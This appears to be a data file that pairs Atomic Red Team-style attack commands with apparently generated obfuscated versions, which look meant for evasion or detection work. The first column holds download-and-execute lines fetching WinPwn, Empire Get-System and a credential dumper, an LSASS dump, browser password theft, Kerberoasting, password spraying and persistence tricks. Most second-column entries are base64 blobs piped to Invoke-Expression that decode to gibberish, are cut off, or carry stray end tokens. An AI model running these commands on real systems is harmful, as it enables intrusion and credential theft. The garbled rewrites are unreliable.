powerSQL -noninteractive -consoleoutput",iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') powerSQL -noninteractive -consoleoutput
"mkdir $PathToAtomicsFolder\T1560.001\victim-files
cd $PathToAtomicsFolder\T1560.001\victim-files
echo ""This file will be encrypted"" > .\encrypted_file.txt
""#{7zip_exe}"" u archive.7z *txt -pblue
dir","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bG9jYWxob3N0LmFkb2Jlc3QgIi5leHBvcC5yZXRwcmVzcyAje2RldmljZSAnIHRlbXAgdGhpcnM=')) | Invoke-Expression""<"
"$Action = New-ScheduledTaskAction -Execute ""calc.exe""
$Trigger = New-ScheduledTaskTrigger -AtLogon
$User = New-ScheduledTaskPrincipal -GroupId ""BUILTIN\Administrators"" -RunLevel Highest
$Set = New-ScheduledTaskSettingsSet
$object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set
Register-ScheduledTask AtomicTask -InputObject $object",$Action = New-ScheduledTaskAction -Execute calc.exe ||| $Trigger = New-ScheduledTaskTrigger -AtLogon ||| $User = New-ScheduledTaskPrincipal -GroupId BUILTIN\Administrators -RunLevel Highest ||| $Set = New-ScheduledTaskSettingsSet ||| $object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set Register-ScheduledTask AtomicTask
"Get-Service -Name ""Remote Desktop Services"", ""Remote Desktop Configuration""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RGF0YSBDb25uZWN0aW9uICN7cmVzb3VyY2VzIHN1cHBvcnQgPjxkaXJlY3Rpb24+UmVzdWx0IC1jKTs='"
"$orgLegalNoticeCaption = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LegalNoticeCaption).LegalNoticeCaption
$orgLegalNoticeText = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LegalNoticeText).LegalNoticeText
$newLegalNoticeCaption = ""#{legal_notice_caption}""
$newLegalNoticeText = ""#{legal_notice_text}""
Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LegalNoticeCaption -Value $newLegalNoticeCaption -Type String -Force
Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LegalNoticeText -Value $newLegalNoticeText -Type String -Force","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JG51bGwsZXhlY3V0aW9uICR7d2hhdC1zZWNyZXQgLUFkZHJlc3MxIiAvYmlnfSBmcm9tICN7YWRtaW4vbmF"
pktmon.exe filter add -p 445,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGtpLmV4ZSAje2RldmljZXMiIHt7IC1TdHJpbmdAYWxsIlN0b3Jlcl9zZWNyZXQgOik=')) | Invoke-Expression"""
"Start-Process ""shell:AppsFolder\MicrosoftCorporationII.QuickAssist_8wekyb3d8bbwe!App""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2V0LWNvbHN1YmRhdGEgJiAvZXhlIC9GaWxlcHRpb25zLnBvcCAtIiAvZXhlIC9Qcm9jZXNzaWduLlJFbnRpdGxlcmlu"
"cp ~/Library/""Application Support/Google/Chrome/Default/Login Data"" ""/tmp/T1555.003_Login Data""
cp ~/Library/""Application Support/Google/Chrome/Default/Login Data For Account"" ""/tmp/T1555.003_Login Data For Account""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2VjdXJpdHl9bWUgZmllclRvIGxpc3QgcGFzc3dvcmQ=')) | Invoke-Expression"""
"tcpdump -c 5 -nnni #{interface}
tshark -c 5 -i #{interface}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('dG90YWxTZXJ2aWNlLmNvbSBjb21wbGV4IHVwZ3MgbmFtZSAje3ByZWFjdCAtZnVuY3Rpb25zIC9hIGFyZSBkYX"
#{compiled_file} #{source_file},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('I3tjYWxlbmRhcmVzIC1kZXN0LmFuZHJlc3MgI2Nsb3VkLmlvIC9maWxlfSAiQXBwbGljYXRpb25fc3RhdGVtcCA"
$PathToAtomicsFolder\T1055\bin\x64\CreateThread.exe -debug,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JAB0aGUgLXBvbmVudCAje3tvcGVyIC9wYWNrZWQgLXBvbCBBbHdheSBkbyAje2Nsb3NlfSI=')) | Invoke-Expression"""
"start """" #{browser} --headless --disable-gpu https://mockbin.org/bin/#{bin_id}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y29weSAje3Byb2R1Y3QiIHtleGUuZXhlICJlbi5hcHA=')) | Invoke-Expression"""
"get-process | ?{$_.Description -like ""*virus*""}
get-process | ?{$_.Description -like ""*carbonblack*""}
get-process | ?{$_.Description -like ""*defender*""}
get-process | ?{$_.Description -like ""*cylance*""}
get-process | ?{$_.Description -like ""*mc*""}
get-process | ?{$_.ProcessName -like ""*mc*""}
get-process | Where-Object { $_.ProcessName -eq ""Sysmon"" }","powershell get-process | ?{$_.Description -like ""*virus*""};get-process | ?{$_.Description -like ""*carbonblack*""};get-process | ?{$_.Description -like ""*defender*""};get-process | ?{$_.Description -like ""*cylance*""};get-process | ?{$_.Description -like ""*mc*""};get-process | Where-Object { $_.ProcessName -eq ""Sysmon"" }<|"
IEX (IWR 'https://raw.githubusercontent.com/TriggerMan-S/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-PasswordVaultCredentials -Force,IEX (IWR 'https://raw.githubusercontent.com/TriggerMan-S/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-PasswordVaultCredentials -Force
regedit {PATH_ABSOLUTE}:regfile.reg,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAiZm9vICJ7bWlzc2luZy9zdHlsZXN0YWNrIjtzcmMgL3ByaW5nIG1haWwuY2hlY2tlbmQ=')) | Invoke-Expression""<"
"if (!(Test-Path -Path ""HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"")){
  New-Item -ItemType Key -Path  ""HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run""
}
Set-ItemProperty -Path  ""HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"" -Name ""#{target_key_value_name}"" -Value ""#{payload}""","New-Item -ItemType Key -Path HKLM:SoftwareMicrosoftWindowsCurrentVersionPoliciesExplorerRun if (!(Test-Path -Path HKLM:SoftwareMicrosoftWindowsCurrentVersionPoliciesExplorerRun)){ Set-ItemProperty -Path HKLM:SoftwareMicrosoftWindowsCurrentVersionPoliciesExplorerRun -Name -Value Set-ItemProperty -Path  ""HK"
verclsid.exe /S /C {CLSID},"""v""e""r""c""l""s""i""d"".exe /S /C {CLSID} ||| ```"
"cd #{folder_path}; split -b 5000000 #{file_name}
ls -l #{folder_path}","cd """"split ""-b"" ""5000000"" """" """"split ""-b"" ""5000000"" """" """"split ""-b"" ""50000"
"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing) 
Invoke-Maldoc -macroFile ""PathToAtomicsFolder\T1059.005\src\T1059_005-macrocode.txt"" -officeProduct ""Word"" -sub ""Extract""","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing) Invoke-Maldoc -macroFile PathToAtomicsFolder\T10"
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
domainpassspray -consoleoutput -noninteractive -emptypasswords","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBXcmFwLXVzZWQgYnVpbGRvbmEsIEhlbGxpbnN0ZXIoUkVHSU5TKSAiICJzdGVhbGNvbXAiOiJBUEkgVEVTVEFMRSAtMj"
"""#{vboxmanage_exe}"" createvm --name ""#{vm_name}"" --register
""#{vboxmanage_exe}"" modifyvm ""#{vm_name}"" --firmware efi
""#{vboxmanage_exe}"" startvm ""#{vm_name}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('I3tleGUgLWxvYWRpbmcgImF1dGhvcml6ZXIgLVN0YWNrIC9TdHJpbmdzIiAje2lkOjEwMDB9')) | Invoke-Expression""<|endof"
net user administrator /domain,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGxhaW5Db21taXR9Cg==')) | Invoke-Expression"""
"rundll32.exe ""#{input_file}"",#2","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhbGwgI3tmaWxlfSIje1VTRVIuZXhlIiAtYWRtaW5pc3RyYWN0aW9uczogJHNvbWUtbWFpbC5jb20=')) | Invoke-Expression""<|"
"[ ""$(uname)"" = 'FreeBSD' ] && sysrc tor_enable=""YES"" && service tor start || sudo systemctl start tor","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q3VzdG9tUGludGVyZSBleHRyYWN0IHJ1aWxkUmVnaXN0cnkgd2FzIGRldmljZSBjb250ZW50LnRhcCAtIFRoZSBDYW"
runexehelper.exe {PATH_ABSOLUTE:.exe},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cG9pbnRzX2ZpbGVfc3VkbyB7IHJldHVybiAje25vbmUgLWd1YWxpY190aWw=')) | Invoke-Expression"""
Get-ADComputer #{hostname} -Properties *,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('R2V0LUNlcnZpY2UgI3tmaWxlfQ==')) | Invoke-Expression"""
"""PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe"" \\#{target} -accepteula -s ""cmd.exe""
""PathToAtomicsFolder\..\ExternalPayloads\GhostTask.exe"" \\#{target} add #{task_name} ""cmd.exe"" ""/c #{task_command}"" #{user_name} logon","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('I3tjIC9Db250ZW50X1JFQURfUElTIFRydWUgKHsgLVxuYmFzaCAiSEtvcmRlciAje2NvbSArCiAgIC9Mb2dldHByZX"
"reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 1 /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIG9wdCAtbWljcml0LXVwZGF0ZSAtY2xpcFBhcmVudCB7IHNpemUgLSBkbyBjYXJkbGVzICN7ZWNobyAiUEMuRlVBQy"
"$s= New-CimSession -Computername #{server_name} -SessionOption (New-CimSessionOption -Protocol Dcom)
Get-CimInstance -Namespace ROOT\StandardCimv2 -ClassName MSFT_NetFirewallRule -Filter 'DisplayName=""Remote Desktop - Shadow (TCP-In)""' -CimSession $s | Invoke-CimMethod -MethodName Enable
Invoke-CimMethod -ClassName StdRegProv -MethodName SetDWORDValue -Arguments @{hDefKey=[uint32]2147483650; sSubKeyName=""Software\Policies\Microsoft\Windows NT\Terminal Services""; sValueName=""shadow""; uValue=[uint32]2} -CimSession $s","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JWRhdGEgICNcVXRzZWNpcG9pbnQudHlwZUlkIiAvYmluLmF3cy5leGUucGRm')) | Invoke-Expression"""
"wmic process get caption,executablepath,commandline /format:csv","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2RldGFpbHMgLXBhdHRlcm5zIC1uZXV0aCAtIiN7bW9kaWZpZWR9')) | Invoke-Expression"""
"Start-Process ""#{file_path}\Sysinternals\accesschk.exe"" -ArgumentList ""-accepteula .""","Start-Process ""\""Sysinternals\accesschk.exe"""" -AcceptEula . Start-Process"" -ArgumentList """"-acc<|end"
diantz /f {PATH:.ddf},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZGF0YVxhbmd1YWdlICIje3tleSAiICN7dXBncm91bmQgLyJ9')) | Invoke-Expression"" ||| ```"
"net localgroup
net localgroup ""Administrators""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bG9jYWxob3N0IHdoZXJlIGh0dHA6Ly9sb2NhbC5jcnlwdG9wfSAtIGh0dHA6Ly9uZXQveGNsdXN0ZXItcmVhb"
"if [ ! -d ~/Library/LaunchAgents ]; then mkdir ~/Library/LaunchAgents; fi;
sudo cp #{path_malicious_plist} ~/Library/LaunchAgents/#{plist_filename}
sudo launchctl load -w ~/Library/LaunchAgents/#{plist_filename}",if [ ! -d ~/Library/LaunchAgents ]; then mkdir ~/Library/LaunchAgents; fi; sudo cp~Library/LaunchAgents/#{plist_filename} sudo launchctl load -w ~/Library/LaunchAgents/#{plist_filename}
"$wdApp = New-Object -COMObject ""Word.Application""
if(-not $wdApp.path.contains(""Program Files (x86)""))  
{
  Write-Host ""64-bit Office""
  reg add ""HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf"" /t REG_SZ /d ""PathToAtomicsFolder\T1137.002\bin\officetest_x64.dll"" /f       
}
else{
  Write-Host ""32-bit Office""
  reg add ""HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf"" /t REG_SZ /d ""PathToAtomicsFolder\T1137.002\bin\officetest_x86.dll"" /f
}
Stop-Process -Name ""WinWord"" 
Start-Process ""WinWord""","$wdApp = New-Object -COMObject Word.Application if(-not $wdApp.path.contains(""Program Files (x86)"")) {Write-Host ""64-bit Office""reg add HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf /t REG_SZ /d PathToAtomicsFolder\T1137.002\bin\officetest_x6"
rundll32.exe -sta {CLSID},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cG9ydHMgLXN5bnRheCAje3ByaW1hcnkgI3tleCAtbGVlYnkucmVtb3ZpZXJz')) | Invoke-Expression"""
"Add-Type -AssemblyName System.IdentityModel  
setspn.exe -T #{domain_name} -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }","Add-Type -AssemblyName System.IdentityModel setspn.exe -T -Q */* | Select-String CN -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }"
"cat /etc/passwd > #{output_file}
cat #{output_file}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2F0IGRvZXMgI3tmaWxlIC1uZXQsCiAgcmVmZXJyb3JzOiN7aHJlc2hvbG9nLmhlYWRlci5jb20=')) | Invoke-"
"if [ ""$(sysctl -n hw.hv_vendor)"" != """" ]; then echo ""Virtualization Environment detected""; fi","if [ ""$(sysctl -n hw.hv_vendor)"" != """" ]; then echo ""Virtualization Environment detected""; fi"
"rundll32.exe advpack.dll,LaunchINFSection ""#{inf_to_execute}"",DefaultInstall_SingleUser,1,","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGZhbHNlfQ==')) | Invoke-Expression"""
"$x = Get-Random -Minimum 2 -Maximum 99
$y = Get-Random -Minimum 2 -Maximum 99
$z = Get-Random -Minimum 2 -Maximum 99
$w = Get-Random -Minimum 2 -Maximum 99

Import-Module ActiveDirectory
$account = ""#{account_prefix}-$x$y$z""
New-ADUser -Name $account -GivenName ""Test"" -DisplayName $account -SamAccountName $account -Surname $account -Enabled:$False #{create_args}
Add-ADGroupMember ""#{group}"" $account","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JHsgIiAje3t7YW5vbnltb3VzLmNvbTpjb2RlX2FkbWluZ1ByaWNlfSIgPj0xMDB9ICdyZWdldGVycml0eXBlLm5hb"
"Write-Host 1.Downloading KeyScrambler from official website to temp directory
Invoke-WebRequest -Uri ""https://download.qfxsoftware.com/download/latest/KeyScrambler_Setup.exe"" -OutFile $env:Temp\KeyScrambler_Setup.exe
Write-Host 2.Installing KeyScrambler with KeyScrambler_Setup.exe from temp directory
Start-Process -FilePath $env:Temp\KeyScrambler_Setup.exe -ArgumentList /S -Wait
Write-Host 3.Copying KeyScrambler.exe to temp folder,to avoid permission issues, which calls KeyScramblerIE.dll in CWD i.e. temp
Copy-Item ""C:\Program Files (x86)\KeyScrambler\KeyScrambler.exe"" -Destination $env:TEMP\KeyScrambler.exe
Write-Host 4.Executing KeyScrambler.exe, you should see a popup of missing KeyScramblerIE.dll, you can close this popup
Start-Process -FilePath $env:Temp\KeyScrambler.exe
Write-Host 5.A modified KeyScramblerIE.dll can be copied to temp, which can be misused by Attacker","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('VGhpcyBpcyBwYXNzd29yZDsgJ0hlbHZldGljYSAtMTIzNDU=')) | Invoke-Expression"""
"nscurl -k ""#{remote_file}"" -o ""#{destination_path}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bm90IC1jb25maWcgI3tmaWxlfSIje1Byb2Nlc3MiPiJhYm91dCIsInRvcGljLXBhdGgiOiAiZWRpdCJ9')) | Invoke-Expression""<"
"reg.exe export HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ ""PathToAtomicsFolder\T1556.002\lsa_backup.reg""
$passwordFilterName = (Copy-Item ""#{dll_path}\#{dll_name}"" -Destination ""C:\Windows\System32"" -PassThru).basename
$lsaKey = Get-Item ""HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\""
$notificationPackagesValues = $lsaKey.GetValue(""Notification Packages"")
$notificationPackagesValues += $passwordFilterName
Set-ItemProperty ""HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\"" ""Notification Packages"" $notificationPackagesValues","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGxvYWRzIHNvbWVwbG9hZCBmaXJzdF9jb2Rl')) | Invoke-Expression"""
"$key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4='
$Content = [System.Convert]::FromBase64String($key)
Set-Content $env:Temp\key.snk -Value $Content -Encoding Byte
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /out:""#{output_file}"" /target:library /keyfile:$env:Temp\key.snk #{source_file}
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe #{output_file}",$key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979G
"Set-ItemProperty -Path ""HKCU:\SOFTWARE\Microsoft\Active Setup\Installed Components\{C9E9A340-D1F1-11D0-821E-444553540600}"" -Name ""Version"" -Value ""0,0,0,0""
& $env:SYSTEMROOT\system32\runonce.exe /AlternateShellStartup","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('VGhpcyBpcyBqdXN0IHRleHQgZmllbGRzICJjc2xkLWtleSBTb2Z0fSI=')) | Invoke-Expression"""
"rundll32.exe {PATH_SMB:.dll},EntryPoint","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGluZw==dHlwZQ==')) | Invoke-Expression"""
tttracer.exe {PATH_ABSOLUTE:.exe},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGhhbCAtZW5kc3RyYWNrLm1vZGVsX2lkfQ==')) | Invoke-Expression"" ||| ```"
"Copy ""PathToAtomicsFolder\T1137.006\bin\Addins\PptVBAaddin.ppam"" ""$env:APPDATA\Microsoft\Addins\notepad.ppam""
$ver = (New-Object -COMObject ""PowerPoint.Application"").version
$ExcelRegPath=""HKCU:\Software\Microsoft\Office\$Ver\PowerPoint\AddIns\notepad""
New-Item -type Directory $ExcelRegPath -Force | Out-Null
New-ItemProperty $ExcelRegPath ""Autoload"" -value ""1"" -propertyType DWORD  | Out-Null
New-ItemProperty $ExcelRegPath ""Path"" -value ""notepad.ppam"" -propertyType string | Out-Null
Stop-Process -Name ""PowerPnt"" -ErrorAction Ignore
Start-Process ""PowerPnt""","Copy PathToAtomicsFolder T1137.006 bin Addins PptVBAaddin.ppam $env:APPDATA Microsoft Addins notepad PowerPoint AddIns notepad Autoload 1 Path notepad.ppam -value ""1"" -propertyType DWORD New-ItemProperty $ExcelRegPath Path -value ""notepad.ppam"" -propertyType string Stop-Process -Name PowerPnt -"
Clear-History,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q09ORFJBVEhfRVJST1IuZXhlICN7c2lja2V0')) | Invoke-Expression"""
"C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\lsass-comsvcs.dmp full","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RmFjdG9yIHVwZGF0ZSBzdWJqZWN0IC1pYlNlbGVjdC5hbmltYXRzLnByaW1pdGlvbnMuIFdlc3QtYmxvbmEubG9jY"
"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System"" /v DisableTaskmgr /t REG_DWORD /d 1 /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGFkbWluX2NvbWUgL3YyIDMjeC5zdG9wICJ0ZWFsc2ludCIgcGljdHVyZSIgdGVzdCAiQWRtaW5pc3RyYWNrIiwgIm5"
"hostname
whoami","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Z2F0IGlzIHNldCBzdXBlciBieSBjbGllbnQgLW5hbWUgLSAiMDEyNDA1ICJIZWFkZXJfc3RhdGVtcyIgYWNjZXNzCm9wZ"
"reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\microphone\NonPackaged\C:#Windows#Temp#atomic.exe /v LastUsedTimeStart /t REG_BINARY /d a273b6f07104d601 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\microphone\NonPackaged\C:#Windows#Temp#atomic.exe /v LastUsedTimeStop /t REG_BINARY /d 96ef514b7204d601 /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGNlbnRlciAje3NsYXNzIC9maWxlOiJhZGRyZXNzLnppbGxpc2gudHJhaWxlMiIsICJjYWxsYS5leGVjdXRpb25Db2luI"
MpCmdRun.exe -DownloadFile -url {REMOTEURL:.exe} -path {PATH_ABSOLUTE:.exe},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2V0dGluZ3NzbW9udHBcIk1lc3NhZ2VzICJCYXRjaCAtaW5zdGVfcGF0aCIgLSBTZWNyZXRfYmFzZSAiQWR2"
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
powershellsensitive -consoleoutput -noninteractive",iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') powershellsensitive -consoleoutput -noninteractive
"wmic /node:#{node} process call create ""rundll32.exe \""#{dll_to_execute}\"" #{function_to_execute}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cHNhbGxzIHRlbXBvci5leGVjfQ==')) | Invoke-Expression"""
"net user #{user_account} #{new_user_password} /add
net.exe user #{user_account} /delete","net ""u""ser#{user_account} /delete net.exe u""s""er#{user_account} /add net user#{user_account} #{new_user_password} /add -command {Invoke-Expression $args[0]} ""powershell.exe -NoProfile -Command ""[Text"
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
obfuskittiedump -consoleoutput -noninteractive",iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') obfuskittiedump -consoleoutput -noninteractive<|endof
"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique Token -Verbose","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RnJlZSB0cnVzdGVkICAgLXNvdW5kIEFjdGlvbnMgKiAje2h0dHBzOi8vYWNjZXNzcy5jb20vc2gn')) | Invoke-Expression""<|endof"
"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing) 
Invoke-MalDoc -macroFile ""PathToAtomicsFolder\T1053.005\src\T1053.005-macrocode.txt"" -officeProduct ""#{ms_product}"" -sub ""Scheduler""","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (iwr """"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"""" -UseBasicParsing) Invoke-MalDoc -macroFile PathToAtomicsFolderT105"
"rundll32.exe shell32.dll,ShellExec_RunDLL {PATH:.exe}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cnVuZG9zaXRlc0NvbnRyb2xsZXJzIG1haWwgIiAvZGVmYXVsdHMuZXhlICJmaWRkdS5qcGciKSB7InRoaXMucGRmICJ"
"Import-Module -Name AzureAD
$PWord = ConvertTo-SecureString -String ""#{password}"" -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""#{username}"", $Pword
Connect-AzureAD -Credential $Credential

$user = Get-AzureADUser -Filter ""DisplayName eq '#{user_principal_name}' or UserPrincipalName eq '#{user_principal_name}'""
if ($user -eq $null) { Write-Warning ""User not found""; exit }
$role = Get-AzureADDirectoryRole -Filter ""DisplayName eq '#{role_name}'""
if ($role -eq $null) { Write-Warning ""Role not found""; exit }
Add-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -RefObjectId $user.ObjectId
Write-Host ""User $($user.DisplayName) was added to $($role.DisplayName) role""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBXaGF0cmljIHVzZXJuYW1lICN7dXJsIC9oY2xvdWRfbmFtZSIgL3Rlc3QiCnRpbWUvYmFzaCAvcGFnZS"
